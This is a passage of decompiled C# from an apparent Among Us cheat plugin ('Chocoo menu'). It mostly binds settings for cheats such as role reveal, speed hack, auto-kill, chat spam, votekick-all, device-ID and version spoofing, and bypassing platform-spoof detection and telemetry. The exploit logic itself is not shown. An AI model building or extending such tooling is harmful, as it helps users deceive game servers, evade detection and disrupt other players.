    return callId == (byte) 1 || callId == (byte) 4 || callId == (byte) 11 || callId == (byte) 12 || callId == (byte) 14 || callId == (byte) 16 /*0x10*/ || callId == (byte) 19 || callId == (byte) 20 || callId == (byte) 22 || callId == (byte) 24 || callId == (byte) 25 || callId == (byte) 27 || callId == (byte) 31 /*0x1F*/ || callId == (byte) 32 /*0x20*/ || callId == (byte) 34 || callId == (byte) 44 || callId == (byte) 45 || callId == (byte) 46 || callId == (byte) 47 || callId == (byte) 48 /*0x30*/ || callId == (byte) 52 || callId == (byte) 55 || callId == (byte) 56 || callId == (byte) 62 || callId == (byte) 63 /*0x3F*/ || callId == (byte) 64 /*0x40*/ || callId == (byte) 65;
  }

  private static bool CheckDistance(Vector2 playerPos, Vector2 targetPos, float maxDistance)
  {
    return (double) Vector2.Distance(playerPos, targetPos) <= (double) maxDistance;
  }

  private static List<Vector2> GetConsolePositions(SystemTypes systemType)
  {
    List<Vector2> consolePositions = new List<Vector2>();
    if (!Object.op_Implicit((Object) ShipStatus.Instance))
      return consolePositions;
    foreach (Console console in Il2CppArrayBase<Console>.op_Implicit(Object.FindObjectsOfType<Console>()))
    {
      if (console.ConsoleId == systemType)
        consolePositions.Add(Vector2.op_Implicit(((Component) console).transform.position));
    }
    return consolePositions;
  }

  public static bool IsNearConsole(PlayerControl player, SystemTypes systemType, float maxDistance = 2f)
  {
    if (!Object.op_Implicit((Object) player) || !Object.op_Implicit((Object) ShipStatus.Instance))
      return false;
    Vector2 truePosition = player.GetTruePosition();
    foreach (Vector2 consolePosition in ChocooPlugin.GetConsolePositions(systemType))
    {
      if (ChocooPlugin.CheckDistance(truePosition, consolePosition, maxDistance))
        return true;
    }
    return false;
  }

  public virtual void Load()
  {
    ChocooPlugin.Logger = this.Log;
    ChocooPlugin.MenuKey = this.Config.Bind<KeyCode>("Menu Settings", "MenuHotkey", (KeyCode) 277, "The keyboard key used to toggle the menu on and off");
    ClassInjector.RegisterTypeInIl2Cpp<VersionShowerUpdater>();
    ChocooPlugin.Config_TeleportToCursorEnabled = this.Config.Bind<bool>("Features", "TeleportToCursor", false, "Teleport to cursor on right click");
    ChocooPlugin.Config_AlwaysShowChatEnabled = this.Config.Bind<bool>("Features", "AlwaysShowChat", false, "Always show chat");
    ChocooPlugin.Config_RevealRolesEnabled = this.Config.Bind<bool>("Features", "RevealRoles", false, "See everyone's roles");
    ChocooPlugin.Config_RevealVotesEnabled = this.Config.Bind<bool>("Features", "RevealVotes", false, "See votes in meetings");
    ChocooPlugin.Config_ZoomOutEnabled = this.Config.Bind<bool>("Features", "ZoomOut", false, "Enable zoom out");
    ChocooPlugin.Config_SeeGhostsEnabled = this.Config.Bind<bool>("Features", "SeeGhosts", false, "See ghost players");
    ChocooPlugin.Config_AntiExploitsEnabled = this.Config.Bind<bool>("Features", "AntiExploits", false, "Enable Anti-Exploits protection");
    ChocooPlugin.Config_MoreLobbyInfoEnabled = this.Config.Bind<bool>("Features", "MoreLobbyInfo", false, "Show extended lobby information");
    ChocooPlugin.Config_ShowHostEnabled = this.Config.Bind<bool>("Features", "ShowHost", false, "Show host in ping tracker");
    ChocooPlugin.Config_SeeModUsersEnabled = this.Config.Bind<bool>("Features", "SeeModUsers", true, "Detect other mod users");
    ChocooPlugin.Config_DarkModeEnabled = this.Config.Bind<bool>("Features", "DarkMode", false, "Enable dark mode");
    ChocooPlugin.Config_NoShadowsEnabled = this.Config.Bind<bool>("Features", "NoShadows", false, "Disable shadows (fullbright)");
    ChocooPlugin.Config_ShowLobbyTimerEnabled = this.Config.Bind<bool>("Host", "ShowLobbyTimer", true, "Show lobby countdown timer");
    ChocooPlugin.Config_SpoofMenuEnabled = this.Config.Bind<bool>("Features", "SpoofMenuEnabled", false, "Enable menu spoofing");
    ChocooPlugin.Config_SpoofMenuIndex = this.Config.Bind<int>("Features", "SpoofMenuIndex", 0, "Selected spoofed menu index");
    ChocooPlugin.Config_EndlessVentTime = this.Config.Bind<bool>("Roles", "EndlessVentTime", false, "Engineer: Endless vent time");
    ChocooPlugin.Config_NoVentCooldown = this.Config.Bind<bool>("Roles", "NoVentCooldown", false, "Engineer: No vent cooldown");
    ChocooPlugin.Config_NoVitalsCooldown = this.Config.Bind<bool>("Roles", "NoVitalsCooldown", false, "Scientist: No vitals cooldown");
    ChocooPlugin.Config_EndlessBattery = this.Config.Bind<bool>("Roles", "EndlessBattery", false, "Scientist: Endless battery");
    ChocooPlugin.Config_NoTrackingCooldown = this.Config.Bind<bool>("Roles", "NoTrackingCooldown", false, "Tracker: No tracking cooldown");
    ChocooPlugin.Config_NoTrackingDelay = this.Config.Bind<bool>("Roles", "NoTrackingDelay", false, "Tracker: No tracking delay");
    ChocooPlugin.Config_EndlessTracking = this.Config.Bind<bool>("Roles", "EndlessTracking", false, "Tracker: Endless tracking duration");
    ChocooPlugin.Config_EndlessShapeshiftDuration = this.Config.Bind<bool>("Roles", "EndlessShapeshiftDuration", false, "Shapeshifter: Endless shapeshift duration");
    ChocooPlugin.Config_NoShapeshiftAnimation = this.Config.Bind<bool>("Roles", "NoShapeshiftAnimation", false, "Shapeshifter: No shapeshift animation");
    ChocooPlugin.Config_UnlimitedKillRange = this.Config.Bind<bool>("Roles", "UnlimitedKillRange", false, "Impostor: Unlimited kill range");
    ChocooPlugin.Config_ImpostorTasksEnabled = this.Config.Bind<bool>("Roles", "ImpostorTasks", false, "Impostor: Do tasks as impostor");
    ChocooPlugin.Config_UnlimitedInterrogateRange = this.Config.Bind<bool>("Roles", "UnlimitedInterrogateRange", false, "Detective: Unlimited interrogate range");
    ChocooPlugin.Config_ShowKillCooldown = this.Config.Bind<bool>("Features", "ShowKillCooldown", false, "Show kill cooldown overlay");
    ChocooPlugin.Config_NoClipEnabled = this.Config.Bind<bool>("Features", "NoClip", false, "Enable no clip");
    ChocooPlugin.Config_SpinEnabled = this.Config.Bind<bool>("Features", "Spin", false, "Enable spin");
    ChocooPlugin.Config_KillNotificationEnabled = this.Config.Bind<bool>("Features", "KillNotification", false, "Show kill notifications");
    ChocooPlugin.Config_AutoCopyCodeEnabled = this.Config.Bind<bool>("Features", "AutoCopyCode", false, "Auto copy lobby code");
    ChocooPlugin.Config_ShowPlayerInfo = this.Config.Bind<bool>("Features", "ShowPlayerInfo", false, "Show player info overlay");
    ChocooPlugin.Config_KillOtherImpostersEnabled = this.Config.Bind<bool>("Features", "KillOtherImposters", false, "Allow killing other imposters");
    ChocooPlugin.Config_ShowVotekickInfo = this.Config.Bind<bool>("Features", "ShowVotekickInfo", false, "Show votekick info");
    ChocooPlugin.Config_RGBMode = this.Config.Bind<bool>("Visual", "RGBMode", false, "RGB menu colors");
    ChocooPlugin.Config_StealthMode = this.Config.Bind<bool>("Features", "StealthMode", false, "Stealth mode (hide RPC)");
    ChocooPlugin.Config_RandomizeOutfit = this.Config.Bind<bool>("Host", "RandomizeOutfit", false, "Randomize outfit");
    ChocooPlugin.Config_BanBlacklistedEnabled = this.Config.Bind<bool>("Host", "BanBlacklisted", false, "Auto-ban blacklisted players");
    ChocooPlugin.Config_DisableVotekicks = this.Config.Bind<bool>("Host", "DisableVotekicks", false, "Disable votekicks");
    ChocooPlugin.Config_DisableMeetings = this.Config.Bind<bool>("Host", "DisableMeetings", false, "Disable meetings");
    ChocooPlugin.Config_GodModeEnabled = this.Config.Bind<bool>("Host", "GodMode", false, "Enable god mode");
    ChocooPlugin.Config_DisableSabotagesEnabled = this.Config.Bind<bool>("Host", "DisableSabotages", false, "Disable sabotages");
    ChocooPlugin.Config_DisableGameEndEnabled = this.Config.Bind<bool>("Host", "DisableGameEnd", false, "Disable game end");
    ChocooPlugin.Config_AnticheatEnabled = this.Config.Bind<bool>("Anticheat", "Enabled", false, "Enable anticheat");
    ChocooPlugin.Config_AutoBanEnabled = this.Config.Bind<bool>("Anticheat", "AutoBan", false, "Auto-ban detected cheaters");
    ChocooPlugin.Config_FindDatersEnabled = this.Config.Bind<bool>("NoDating", "FindDaters", false, "Find daters lobby filter");
    ChocooPlugin.Config_ExtendedLobbyEnabled = this.Config.Bind<bool>("NoDating", "ExtendedLobby", false, "Extended lobby list");
    ChocooPlugin.Config_SpamChatEnabled = this.Config.Bind<bool>("Chat", "SpamChat", false, "Spam chat");
    ChocooPlugin.Config_VotekickAllEnabled = this.Config.Bind<bool>("Votekick", "VotekickAll", false, "Votekick all players");
    ChocooPlugin.Config_SpoofedLevel = this.Config.Bind<int>("Features", "SpoofedLevel", 0, "Spoofed level value");
    ChocooPlugin.Config_SpoofedPlatform = this.Config.Bind<string>("Features", "SpoofedPlatform", "", "Spoofed platform string");
    ChocooPlugin.Config_SelectedPlatformIndex = this.Config.Bind<int>("Features", "SelectedPlatformIndex", 0, "Selected platform dropdown index");
    ChocooPlugin.Config_CustomPlatformInputText = this.Config.Bind<string>("Features", "CustomPlatformInputText", "", "Custom platform name typed by user");
    ChocooPlugin.Config_SelectedVersionIndex = this.Config.Bind<int>("Features", "SelectedVersionIndex", 0, "Selected game version index");
    ChocooPlugin.Config_SpoofedGameVersion = this.Config.Bind<int>("Features", "SpoofedGameVersion", Constants.GetBroadcastVersion(), "Spoofed game version int");
    ChocooPlugin.Config_GameSpeed = this.Config.Bind<float>("Features", "GameSpeed", 1f, "Game speed multiplier");
    ChocooPlugin.Config_PlayerSpeed = this.Config.Bind<float>("Features", "PlayerSpeed", 1f, "Player speed multiplier");
    ChocooPlugin.Config_CheckAbnormalColorChange = this.Config.Bind<bool>("Anticheat", "CheckAbnormalColorChange", true, "Detect abnormal color changes mid-game");
    ChocooPlugin.Config_CheckAbnormalCosmeticChange = this.Config.Bind<bool>("Anticheat", "CheckAbnormalCosmeticChange", true, "Detect abnormal cosmetic changes mid-game");
    ChocooPlugin.Config_CheckAbnormalTaskCompletion = this.Config.Bind<bool>("Anticheat", "CheckAbnormalTaskCompletion", true, "Detect abnormal task completions");
    ChocooPlugin.Config_CheckAbnormalMurder = this.Config.Bind<bool>("Anticheat", "CheckAbnormalMurder", true, "Detect abnormal murders");
    ChocooPlugin.Config_CheckAbnormalPlatforms = this.Config.Bind<bool>("Anticheat", "CheckAbnormalPlatforms", true, "Detect spoofed platform data");
    ChocooPlugin.Config_CheckAbnormalLevel = this.Config.Bind<bool>("Anticheat", "CheckAbnormalLevel", true, "Detect abnormally high levels");
    ChocooPlugin.Config_CheckAbnormalProtect = this.Config.Bind<bool>("Anticheat", "CheckAbnormalProtect", true, "Detect abnormal guardian angel protections");
    ChocooPlugin.Config_CheckAbnormalShapeshift = this.Config.Bind<bool>("Anticheat", "CheckAbnormalShapeshift", true, "Detect abnormal shapeshifting");
    ChocooPlugin.Config_CheckAbnormalVanish = this.Config.Bind<bool>("Anticheat", "CheckAbnormalVanish", true, "Detect abnormal phantom vanishing");
    ChocooPlugin.Config_CheckAbnormalVenting = this.Config.Bind<bool>("Anticheat", "CheckAbnormalVenting", true, "Detect abnormal venting");
    ChocooPlugin.Config_CheckAbnormalReportMeeting = this.Config.Bind<bool>("Anticheat", "CheckAbnormalReportMeeting", true, "Detect abnormal reports/meetings");
    ChocooPlugin.Config_CheckAbnormalSabotage = this.Config.Bind<bool>("Anticheat", "CheckAbnormalSabotage", true, "Detect abnormal sabotages");
    ChocooPlugin.Config_CheckAbnormalVotekickSpam = this.Config.Bind<bool>("Anticheat", "CheckAbnormalVotekickSpam", true, "Detect votekick spam");
    ChocooPlugin.Config_MaxAllowedLevel = this.Config.Bind<uint>("Anticheat", "MaxAllowedLevel", 10000U, "Maximum allowed player level");
    ChocooPlugin.Config_AccurateDisconnectReasonsEnabled = this.Config.Bind<bool>("Features", "AccurateDisconnectReasons", true, "Show accurate disconnect reasons");
    ChocooPlugin.Config_AllowAllCharactersEnabled = this.Config.Bind<bool>("Features", "AllowAllCharacters", true, "Allow all characters in chat");
    ChocooPlugin.Config_AllowCtrlCVEnabled = this.Config.Bind<bool>("Features", "AllowCtrlCV", false, "Allow Ctrl+C/V in chat");
    ChocooPlugin.Config_AntiBlackoutEnabled = this.Config.Bind<bool>("Features", "AntiBlackout", false, "Prevent blackout sabotage");
    ChocooPlugin.Config_AutoKillEnabled = this.Config.Bind<bool>("Features", "AutoKill", false, "Auto kill players");
    ChocooPlugin.Config_AutoRejoinEnabled = this.Config.Bind<bool>("Features", "AutoRejoin", false, "Auto rejoin on game end");
    ChocooPlugin.Config_AvoidPenaltiesEnabled = this.Config.Bind<bool>("Features", "AvoidPenalties", true, "Avoid penalties");
    ChocooPlugin.Config_BecomeImmortalEnabled = this.Config.Bind<bool>("Features", "BecomeImmortal", false, "Become immortal");
    ChocooPlugin.Config_BypassPlatformDetectionEnabled = this.Config.Bind<bool>("Features", "BypassPlatformDetection", false, "Bypass platform spoof detections");
    ChocooPlugin.Config_BypassURLBlockEnabled = this.Config.Bind<bool>("Features", "BypassURLBlock", false, "Bypass URL block in chat");
    ChocooPlugin.Config_BypassVisualTasksEnabled = this.Config.Bind<bool>("Features", "BypassVisualTasks", false, "Bypass visual tasks being off");
    ChocooPlugin.Config_CosmeticsUnlockerEnabled = this.Config.Bind<bool>("Features", "CosmeticsUnlocker", true, "Unlock all cosmetics");
    ChocooPlugin.Config_DisableAnimations = this.Config.Bind<bool>("Visual", "DisableAnimations", false, "Disable menu animations");
    ChocooPlugin.Config_DisableCustomTheme = this.Config.Bind<bool>("Visual", "DisableCustomTheme", false, "Disable custom menu theme");
    ChocooPlugin.Config_DisableKillAnimationEnabled = this.Config.Bind<bool>("Features", "DisableKillAnimation", false, "Skip death animation");
    ChocooPlugin.Config_DisableTelemetryEnabled = this.Config.Bind<bool>("Features", "DisableTelemetry", true, "Disable telemetry");
    ChocooPlugin.Config_DisableVentingEnabled = this.Config.Bind<bool>("Host", "DisableVenting", false, "Disable venting for all");
    ChocooPlugin.Config_ExtendChatHistoryEnabled = this.Config.Bind<bool>("Features", "ExtendChatHistory", true, "Extend chat history");
    ChocooPlugin.Config_ExtendChatLimitEnabled = this.Config.Bind<bool>("Features", "ExtendChatLimit", false, "Extend chat character limit");
    ChocooPlugin.Config_KeepProtectingAllEnabled = this.Config.Bind<bool>("Roles", "KeepProtectingAll", false, "Keep protecting all players");
    ChocooPlugin.Config_MoveMenuToCursor = this.Config.Bind<bool>("Visual", "MoveMenuToCursor", false, "Move menu to cursor");
    ChocooPlugin.Config_MoveSelfByCursorEnabled = this.Config.Bind<bool>("Features", "MoveSelfByCursor", false, "Slide by cursor");
    ChocooPlugin.Config_NoSeekerAnimEnabled = this.Config.Bind<bool>("Features", "NoSeekerAnim", false, "No seeker animation");
    ChocooPlugin.Config_NoShhScreenEnabled = this.Config.Bind<bool>("Features", "NoShhScreen", false, "No shh screen");
    ChocooPlugin.Config_ReduceChatCooldownEnabled = this.Config.Bind<bool>("Features", "ReduceChatCooldown", false, "Reduce chat cooldown");
    ChocooPlugin.Config_SeePhantomsEnabled = this.Config.Bind<bool>("Features", "SeePhantoms", false, "See phantom players");
    ChocooPlugin.Config_SeePlayersInVentsEnabled = this.Config.Bind<bool>("Features", "SeePlayersInVents", false, "See players in vents");
    ChocooPlugin.Config_SeeProtectionsEnabled = this.Config.Bind<bool>("Features", "SeeProtections", false, "See guardian angel protections");
    ChocooPlugin.Config_SeeRolesEnabled = this.Config.Bind<bool>("Features", "SeeRoles", false, "Reveal roles");
    ChocooPlugin.Config_SetFakeRoleEnabled = this.Config.Bind<bool>("Roles", "SetFakeRole", false, "Enable fake role");
    ChocooPlugin.Config_ShowLevelSpoof = this.Config.Bind<bool>("Features", "ShowLevelSpoof", false, "Spoof level");
    ChocooPlugin.Config_ShowMenuOnStartup = this.Config.Bind<bool>("Visual", "ShowMenuOnStartup", false, "Show menu on startup");
    ChocooPlugin.Config_ShowPlatformSpoof = this.Config.Bind<bool>("Features", "ShowPlatformSpoof", false, "Spoof platform");
    ChocooPlugin.Config_ShowVotekickCounter = this.Config.Bind<bool>("Features", "ShowVotekickCounter", false, "Show votekick counter on nametags");
    ChocooPlugin.Config_SpeedHackEnabled = this.Config.Bind<bool>("Features", "SpeedHack", false, "Enable speed hack");
    ChocooPlugin.Config_SpoofDeviceIdEnabled = this.Config.Bind<bool>("Features", "SpoofDeviceId", true, "Spoof device ID");
    ChocooPlugin.Config_SpoofGameVersionEnabled = this.Config.Bind<bool>("Features", "SpoofGameVersion", false, "Spoof game version");
    ChocooPlugin.Config_TaskSpeedrunEnabled = this.Config.Bind<bool>("Host", "TaskSpeedrun", false, "Task speedrun mode");
    ChocooPlugin.Config_UnlockVentsEnabled = this.Config.Bind<bool>("Features", "UnlockVents", false, "Unlock vents");
    ChocooPlugin.Config_UseModdedProtocol = this.Config.Bind<bool>("Features", "UseModdedProtocol", false, "Use modded protocol");
    ChocooPlugin.Config_VotekickAutoRejoinEnabled = this.Config.Bind<bool>("Host", "VotekickAutoRejoin", false, "Votekick all with auto rejoin");
    ChocooPlugin.ShowKillCooldown = ChocooPlugin.Config_ShowKillCooldown.Value;
    ChocooPlugin.NoClipEnabled = ChocooPlugin.Config_NoClipEnabled.Value;
    ChocooPlugin.SpinEnabled = ChocooPlugin.Config_SpinEnabled.Value;
    ChocooPlugin.KillNotificationEnabled = ChocooPlugin.Config_KillNotificationEnabled.Value;
    ChocooPlugin.AutoCopyCodeEnabled = ChocooPlugin.Config_AutoCopyCodeEnabled.Value;
    ChocooPlugin.AntiExploitsEnabled = ChocooPlugin.Config_AntiExploitsEnabled.Value;
    ChocooPlugin.ShowPlayerInfo = ChocooPlugin.Config_ShowPlayerInfo.Value;
    ChocooPlugin.KillOtherImpostersEnabled = ChocooPlugin.Config_KillOtherImpostersEnabled.Value;
    ChocooPlugin.ShowVotekickInfo = ChocooPlugin.Config_ShowVotekickInfo.Value;
    ChocooPlugin.NoShadowsEnabled = ChocooPlugin.Config_NoShadowsEnabled.Value;
    ChocooPlugin.RGBMode = ChocooPlugin.Config_RGBMode.Value;
    ChocooPlugin.StealthMode = ChocooPlugin.Config_StealthMode.Value;
    ChocooPlugin.RandomizeOutfit = ChocooPlugin.Config_RandomizeOutfit.Value;
    ChocooPlugin.BanBlacklistedEnabled = ChocooPlugin.Config_BanBlacklistedEnabled.Value;
    ChocooPlugin.DisableVotekicks = ChocooPlugin.Config_DisableVotekicks.Value;
    ChocooPlugin.DisableMeetings = ChocooPlugin.Config_DisableMeetings.Value;
    ChocooPlugin.GodModeEnabled = ChocooPlugin.Config_GodModeEnabled.Value;
    ChocooPlugin.DisableSabotagesEnabled = ChocooPlugin.Config_DisableSabotagesEnabled.Value;
    ChocooPlugin.DisableGameEndEnabled = ChocooPlugin.Config_DisableGameEndEnabled.Value;
    ChocooPlugin.AnticheatEnabled = ChocooPlugin.Config_AnticheatEnabled.Value;
    ChocooPlugin.AutoBanEnabled = ChocooPlugin.Config_AutoBanEnabled.Value;
    ChocooPlugin.FindDatersEnabled = ChocooPlugin.Config_FindDatersEnabled.Value;
    ChocooPlugin.ExtendedLobbyEnabled = ChocooPlugin.Config_ExtendedLobbyEnabled.Value;
    ChocooPlugin.ChocooMenu.SpamChatEnabled = ChocooPlugin.Config_SpamChatEnabled.Value;
    ChocooPlugin.VotekickAllEnabled = ChocooPlugin.Config_VotekickAllEnabled.Value;
    ChocooPlugin.TeleportToCursorEnabled = ChocooPlugin.Config_TeleportToCursorEnabled.Value;
    ChocooPlugin.AlwaysShowChatEnabled = ChocooPlugin.Config_AlwaysShowChatEnabled.Value;
    ChocooPlugin.SeeRolesEnabled = ChocooPlugin.Config_RevealRolesEnabled.Value;
    ChocooPlugin.RevealVotesEnabled = ChocooPlugin.Config_RevealVotesEnabled.Value;
    ChocooPlugin.ZoomOutEnabled = ChocooPlugin.Config_ZoomOutEnabled.Value;
    ChocooPlugin.SeeGhostsEnabled = ChocooPlugin.Config_SeeGhostsEnabled.Value;
    ChocooPlugin.MoreLobbyInfoEnabled = ChocooPlugin.Config_MoreLobbyInfoEnabled.Value;
    ChocooPlugin.ShowHostEnabled = ChocooPlugin.Config_ShowHostEnabled.Value;
    ChocooPlugin.SeeModUsersEnabled = ChocooPlugin.Config_SeeModUsersEnabled.Value;
    ChocooPlugin.DarkModeEnabled = ChocooPlugin.Config_DarkModeEnabled.Value;
    ChocooPlugin.ShowLobbyTimerEnabled = ChocooPlugin.Config_ShowLobbyTimerEnabled.Value;
    ChocooPlugin.SpoofMenuEnabled = ChocooPlugin.Config_SpoofMenuEnabled.Value;
    ChocooPlugin.selectedSpoofMenuIndex = ChocooPlugin.Config_SpoofMenuIndex.Value;
    ChocooPlugin.EndlessVentTime = ChocooPlugin.Config_EndlessVentTime.Value;
    ChocooPlugin.NoVentCooldown = ChocooPlugin.Config_NoVentCooldown.Value;
    ChocooPlugin.NoVitalsCooldown = ChocooPlugin.Config_NoVitalsCooldown.Value;
    ChocooPlugin.EndlessBattery = ChocooPlugin.Config_EndlessBattery.Value;
    ChocooPlugin.NoTrackingCooldown = ChocooPlugin.Config_NoTrackingCooldown.Value;
    ChocooPlugin.NoTrackingDelay = ChocooPlugin.Config_NoTrackingDelay.Value;
    ChocooPlugin.EndlessTracking = ChocooPlugin.Config_EndlessTracking.Value;
    ChocooPlugin.EndlessShapeshiftDuration = ChocooPlugin.Config_EndlessShapeshiftDuration.Value;
    ChocooPlugin.NoShapeshiftAnimation = ChocooPlugin.Config_NoShapeshiftAnimation.Value;
    ChocooPlugin.UnlimitedKillRange = ChocooPlugin.Config_UnlimitedKillRange.Value;
    ChocooPlugin.ImpostorTasksEnabled = ChocooPlugin.Config_ImpostorTasksEnabled.Value;
    ChocooPlugin.UnlimitedInterrogateRange = ChocooPlugin.Config_UnlimitedInterrogateRange.Value;
    ChocooPlugin.SpoofedLevel = ChocooPlugin.Config_SpoofedLevel.Value;
    ChocooPlugin.SpoofedPlatform = ChocooPlugin.Config_SpoofedPlatform.Value;
    ChocooPlugin.SelectedPlatformIndex = ChocooPlugin.Config_SelectedPlatformIndex.Value;
    ChocooPlugin.SelectedVersionIndex = ChocooPlugin.Config_SelectedVersionIndex.Value;
    ChocooPlugin.SpoofedGameVersion = ChocooPlugin.Config_SpoofedGameVersion.Value;
    ChocooPlugin.GameSpeed = ChocooPlugin.Config_GameSpeed.Value;
    ChocooPlugin.PlayerSpeed = ChocooPlugin.Config_PlayerSpeed.Value;
    ChocooPlugin.CheckAbnormalColorChange = ChocooPlugin.Config_CheckAbnormalColorChange.Value;
    ChocooPlugin.CheckAbnormalCosmeticChange = ChocooPlugin.Config_CheckAbnormalCosmeticChange.Value;
    ChocooPlugin.CheckAbnormalTaskCompletion = ChocooPlugin.Config_CheckAbnormalTaskCompletion.Value;
    ChocooPlugin.CheckAbnormalMurder = ChocooPlugin.Config_CheckAbnormalMurder.Value;
    ChocooPlugin.CheckAbnormalLevel = ChocooPlugin.Config_CheckAbnormalLevel.Value;
    ChocooPlugin.CheckAbnormalProtect = ChocooPlugin.Config_CheckAbnormalProtect.Value;
    ChocooPlugin.CheckAbnormalPlatforms = ChocooPlugin.Config_CheckAbnormalPlatforms.Value;
    ChocooPlugin.CheckAbnormalShapeshift = ChocooPlugin.Config_CheckAbnormalShapeshift.Value;
    ChocooPlugin.CheckAbnormalVanish = ChocooPlugin.Config_CheckAbnormalVanish.Value;
    ChocooPlugin.CheckAbnormalVenting = ChocooPlugin.Config_CheckAbnormalVenting.Value;
    ChocooPlugin.CheckAbnormalReportMeeting = ChocooPlugin.Config_CheckAbnormalReportMeeting.Value;
    ChocooPlugin.CheckAbnormalSabotage = ChocooPlugin.Config_CheckAbnormalSabotage.Value;
    ChocooPlugin.CheckAbnormalVotekickSpam = ChocooPlugin.Config_CheckAbnormalVotekickSpam.Value;
    ChocooPlugin.MaxAllowedLevel = ChocooPlugin.Config_MaxAllowedLevel.Value;
    ChocooPlugin.AccurateDisconnectReasonsEnabled = ChocooPlugin.Config_AccurateDisconnectReasonsEnabled.Value;
    ChocooPlugin.AllowAllCharactersEnabled = ChocooPlugin.Config_AllowAllCharactersEnabled.Value;
    ChocooPlugin.AllowCtrlCVEnabled = ChocooPlugin.Config_AllowCtrlCVEnabled.Value;
    ChocooPlugin.AntiBlackoutEnabled = ChocooPlugin.Config_AntiBlackoutEnabled.Value;
    ChocooPlugin.AutoKillEnabled = ChocooPlugin.Config_AutoKillEnabled.Value;
    ChocooPlugin.AutoRejoinEnabled = ChocooPlugin.Config_AutoRejoinEnabled.Value;
    ChocooPlugin.AvoidPenaltiesEnabled = ChocooPlugin.Config_AvoidPenaltiesEnabled.Value;
    ChocooPlugin.BecomeImmortalEnabled = ChocooPlugin.Config_BecomeImmortalEnabled.Value;
    ChocooPlugin.BypassPlatformDetectionEnabled = ChocooPlugin.Config_BypassPlatformDetectionEnabled.Value;
    ChocooPlugin.BypassURLBlockEnabled = ChocooPlugin.Config_BypassURLBlockEnabled.Value;
    ChocooPlugin.BypassVisualTasksEnabled = ChocooPlugin.Config_BypassVisualTasksEnabled.Value;
    ChocooPlugin.CosmeticsUnlockerEnabled = ChocooPlugin.Config_CosmeticsUnlockerEnabled.Value;
    ChocooPlugin.DisableAnimations = ChocooPlugin.Config_DisableAnimations.Value;
    ChocooPlugin.DisableCustomTheme = ChocooPlugin.Config_DisableCustomTheme.Value;
    ChocooPlugin.DisableKillAnimationEnabled = ChocooPlugin.Config_DisableKillAnimationEnabled.Value;
    ChocooPlugin.DisableTelemetryEnabled = ChocooPlugin.Config_DisableTelemetryEnabled.Value;
    ChocooPlugin.DisableVentingEnabled = ChocooPlugin.Config_DisableVentingEnabled.Value;
    ChocooPlugin.ExtendChatHistoryEnabled = ChocooPlugin.Config_ExtendChatHistoryEnabled.Value;
    ChocooPlugin.ExtendChatLimitEnabled = ChocooPlugin.Config_ExtendChatLimitEnabled.Value;
    ChocooPlugin.KeepProtectingAllEnabled = ChocooPlugin.Config_KeepProtectingAllEnabled.Value;
    ChocooPlugin.MoveMenuToCursor = ChocooPlugin.Config_MoveMenuToCursor.Value;
    ChocooPlugin.MoveSelfByCursorEnabled = ChocooPlugin.Config_MoveSelfByCursorEnabled.Value;
    ChocooPlugin.NoSeekerAnimEnabled = ChocooPlugin.Config_NoSeekerAnimEnabled.Value;
    ChocooPlugin.NoShhScreenEnabled = ChocooPlugin.Config_NoShhScreenEnabled.Value;
    ChocooPlugin.ReduceChatCooldownEnabled = ChocooPlugin.Config_ReduceChatCooldownEnabled.Value;
    ChocooPlugin.SeePhantomsEnabled = ChocooPlugin.Config_SeePhantomsEnabled.Value;
    ChocooPlugin.SeePlayersInVentsEnabled = ChocooPlugin.Config_SeePlayersInVentsEnabled.Value;
    ChocooPlugin.SeeProtectionsEnabled = ChocooPlugin.Config_SeeProtectionsEnabled.Value;
    ChocooPlugin.SeeRolesEnabled = ChocooPlugin.Config_SeeRolesEnabled.Value;
    ChocooPlugin.SetFakeRoleEnabled = ChocooPlugin.Config_SetFakeRoleEnabled.Value;
    ChocooPlugin.ShowLevelSpoof = ChocooPlugin.Config_ShowLevelSpoof.Value;
    ChocooPlugin.ShowMenuOnStartup = ChocooPlugin.Config_ShowMenuOnStartup.Value;
    ChocooPlugin.ShowPlatformSpoof = ChocooPlugin.Config_ShowPlatformSpoof.Value;
    ChocooPlugin.ShowVotekickCounter = ChocooPlugin.Config_ShowVotekickCounter.Value;
    ChocooPlugin.SpeedHackEnabled = ChocooPlugin.Config_SpeedHackEnabled.Value;
    ChocooPlugin.SpoofDeviceIdEnabled = ChocooPlugin.Config_SpoofDeviceIdEnabled.Value;
    ChocooPlugin.SpoofGameVersionEnabled = ChocooPlugin.Config_SpoofGameVersionEnabled.Value;
    ChocooPlugin.TaskSpeedrunEnabled = ChocooPlugin.Config_TaskSpeedrunEnabled.Value;
    ChocooPlugin.UnlockVentsEnabled = ChocooPlugin.Config_UnlockVentsEnabled.Value;
    ChocooPlugin.UseModdedProtocol = ChocooPlugin.Config_UseModdedProtocol.Value;
    ChocooPlugin.VotekickAutoRejoinEnabled = ChocooPlugin.Config_VotekickAutoRejoinEnabled.Value;
    try
    {
      new Harmony("com.chocoo.menu").PatchAll();
      if (Application.platform != 11 && ChocooPlugin.DisableTelemetryEnabled)
      {
        UnityEngine.Analytics.Analytics.deviceStatsEnabled = false;
        UnityEngine.Analytics.Analytics.enabled = false;
        UnityEngine.Analytics.Analytics.initializeOnStartup = false;
        UnityEngine.Analytics.Analytics.limitUserTracking = true;
        UnityEngine.CrashReportHandler.CrashReportHandler.enableCaptureExceptions = false;
        PerformanceReporting.enabled = false;
      }
      ChocooPlugin.Logger.LogInfo((object) "Harmony patches applied successfully");
    }
    catch (Exception ex)
    {
      ChocooPlugin.Logger.LogError((object) ("Harmony patching failed: " + ex.Message));
    }
    this.AddComponent<ChocooPlugin.ChocooMenu>();
    this.AddComponent<HostCommandPatch.RolesUI>();
    this.AddComponent<HostCommandPatch.ForceColorUI>();
    ChocooPlugin.LoadBlacklist();
  }

  public static Color GetRGBColor()
  {
    if (!ChocooPlugin.RGBMode)
      return new Color(0.05f, 0.05f, 0.05f, 0.98f);
    if (!ChocooPlugin.colorLocked)
    {
      ChocooPlugin.colorLocked = true;
      ChocooPlugin.UpdateRGBBreathing();
      Color rgb1 = Color.HSVToRGB(ChocooPlugin.rgbHue, 0.6f * ChocooPlugin.breatheIntensity, 0.4f * ChocooPlugin.breatheIntensity);
      rgb1.a = 0.95f;
      ChocooPlugin._cachedRGBColor = rgb1;
      Color rgb2 = Color.HSVToRGB(ChocooPlugin.rgbHue, 0.5f * ChocooPlugin.breatheIntensity, 0.3f * ChocooPlugin.breatheIntensity);
      rgb2.a = 1f;
      ChocooPlugin._cachedRGBAccent = rgb2;
